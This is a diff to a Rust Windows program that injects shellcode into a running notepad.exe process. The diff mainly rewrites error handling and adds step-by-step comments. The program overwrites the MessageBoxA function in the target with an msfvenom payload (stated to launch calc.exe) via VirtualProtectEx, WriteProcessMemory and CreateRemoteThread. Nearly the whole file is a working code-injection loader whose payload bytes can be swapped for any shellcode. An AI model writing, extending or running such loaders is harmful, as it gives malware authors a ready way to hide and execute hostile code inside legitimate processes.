@@ -1,44 +1,51 @@
-use std::{
-    ffi::c_void,
-    mem::transmute,
-    ptr::{null, null_mut},
-};
 use sysinfo::{PidExt, ProcessExt, System, SystemExt};
 use windows::{
-    core::s,
-    Win32::Foundation::HANDLE,
-    Win32::System::{
-        Diagnostics::Debug::WriteProcessMemory,
-        LibraryLoader::{GetProcAddress, LoadLibraryA},
-        Memory::{VirtualProtectEx, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE},
-        Threading::{
-            CreateRemoteThread, OpenProcess, WaitForSingleObject, INFINITE, PROCESS_ALL_ACCESS,
+    core::{s, Error, Result},
+    Win32::{
+        Foundation::{E_FAIL, HANDLE},
+        System::{
+            Diagnostics::Debug::WriteProcessMemory,
+            LibraryLoader::{GetProcAddress, LoadLibraryA},
+            Memory::{
+                VirtualProtectEx, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
+            },
+            Threading::{
+                CreateRemoteThread, OpenProcess, WaitForSingleObject, INFINITE, PROCESS_ALL_ACCESS,
+            },
         },
     },
 };
 
-fn find_process(name: &str) -> Result<HANDLE, String> {
+/// Finds a process by its executable name and opens it with full access rights.
+///
+/// # Parameters
+///
+/// * `name` - The name of the process to search for (e.g., `"notepad.exe"`).
+///
+/// # Returns
+///
+/// * `Ok(HANDLE)` - if process found and opened.
+/// * `Err` - if process not found or cannot open.
+fn find_process(name: &str) -> Result<HANDLE> {
     let mut system = System::new_all();
     system.refresh_all();
 
-    for (pid, process) in system.processes() {
-        if process.name() == name {
-            let pid = pid.as_u32();
-            let hprocess = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, pid) };
-            if hprocess.is_err() {
-                return Err(String::from(format!(
-                    "Failed to open process with PID: {pid}"
-                )));
-            } else {
-                return Ok(hprocess.unwrap());
-            }
-        }
+    let processes = system
+        .processes()
+        .values()
+        .filter(|process| process.name().to_lowercase() == name)
+        .collect::<Vec<_>>();
+
+    if let Some(process) = processes.into_iter().next() {
+        println!("[-] Process with PID found: {}", process.pid());
+        let hprocess = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, process.pid().as_u32())? };
+        return Ok(hprocess);
     }
 
-    return Err(String::from("Process not found"));
+    Err(Error::new(E_FAIL, "Error finding process PID".into()))
 }
 
-fn main() {
+fn main() -> Result<()> {
     // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
     let shellcode: [u8; 276] = [
         0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
@@ -62,63 +69,57 @@ fn main() {
         0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
     ];
     unsafe {
-        let hprocess = find_process("Notepad.exe").unwrap_or_else(|e| {
-            panic!("[!] find_process Failed With Error: {e}");
-        });
+        // Find and open notepad.exe process to inject the payload
+        let hprocess = find_process("notepad.exe")?;
 
-        let hmodule = LoadLibraryA(s!("user32")).unwrap_or_else(|e| {
-            panic!("[!] LoadLibraryA Failed With Error: {e}");
-        });
+        // Load user32.dll in the target process for accessing MessageBoxA address
+        let hmodule = LoadLibraryA(s!("user32"))?;
 
-        let func = GetProcAddress(hmodule, s!("MessageBoxA")).unwrap_or_else(|| {
-            panic!("[!] GetProcAddress Failed");
-        });
+        // Get the address of MessageBoxA to overwrite with shellcode
+        let func = GetProcAddress(hmodule, s!("MessageBoxA")).ok_or_else(|| Error::from_win32())?
+            as *const u8;
 
-        let func_ptr = transmute::<_, *mut c_void>(func);
-
+        // Change memory protections at func to writable so the shellcode can be injected
         let mut oldprotect = PAGE_PROTECTION_FLAGS(0);
         VirtualProtectEx(
             hprocess,
-            func_ptr,
+            func.cast(),
             shellcode.len(),
             PAGE_READWRITE,
             &mut oldprotect,
-        ).unwrap_or_else(|e| {
-            panic!("[!] VirtualProtectEx (1) Failed With Error: {e}");
-        });
+        )?;
 
+        // Write the shellcode into the memory space of the target process
         WriteProcessMemory(
             hprocess,
-            func_ptr,
-            shellcode.as_ptr() as _,
+            func.cast(),
+            shellcode.as_ptr().cast(),
             shellcode.len(),
             None,
-        ).unwrap_or_else(|e| {
-            panic!("[!] WriteProcessMemory Failed With Error: {e}");
-        });
+        )?;
 
+        // Restore memory protections to allow execution of the newly injected shellcode
         VirtualProtectEx(
             hprocess,
-            func_ptr,
+            func.cast(),
             shellcode.len(),
-            PAGE_EXECUTE_READWRITE,
+            PAGE_EXECUTE_READ,
             &mut oldprotect,
-        ).unwrap_or_else(|e| {
-            panic!("[!] VirtualProtectEx (2) Failed With Error: {e}");
-        });
+        )?;
 
+        // Start a new thread at the shellcode location to execute it inside the target process
         let hthread = CreateRemoteThread(
             hprocess,
-            Some(null()),
+            None,
             0,
-            Some(transmute(func_ptr)),
-            Some(null()),
+            Some(std::mem::transmute(func.cast_mut())),
+            None,
             0,
-            Some(null_mut()),
-        ).unwrap_or_else(|e| {
-            panic!("[!] CreateRemoteThread Failed With Error: {e}");
-        });
+            None,
+        )?;
 
         WaitForSingleObject(hthread, INFINITE);
     }
+
+    Ok(())
 }
